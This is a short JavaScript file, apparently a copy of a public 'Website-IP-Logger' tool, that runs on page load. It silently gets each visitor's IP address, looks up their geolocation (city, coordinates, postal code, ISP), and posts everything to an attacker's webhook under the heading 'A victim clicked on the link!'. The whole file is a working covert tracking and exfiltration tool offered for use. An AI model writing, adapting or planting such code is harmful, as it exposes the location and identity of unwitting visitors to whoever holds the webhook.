// give all credit to elk
// https://github.com/3elk/Website-IP-Logger
const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'WEBHOOK URL'; // replace with your webhook url
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "site logger <3", // optionally changeable
                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
                            content: `A victim clicked on the link! @here\n=====================\nIP Address >> ${ipadd}\nNetwork >> ${geoData.network}\nCountry >> ${geoData.country_code}/${geoData.country_name}\nRegion/State >> ${geoData.region}\nCity/Town >> ${geoData.city}\nLatitude >> ${geoData.latitude}\nLongitude >> ${geoData.longitude}\nTimeZone >> ${geoData.timezone}\nPostal Code >> ${geoData.postal}\nLanguages >> ${geoData.languages}\nCurrency >> ${geoData.currency}/${geoData.currency_name}\nASN >> ${geoData.asn}\nORG >> ${geoData.org}\n=====================\nᓚᘏᗢ - e l k w a s h e r e -`
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();
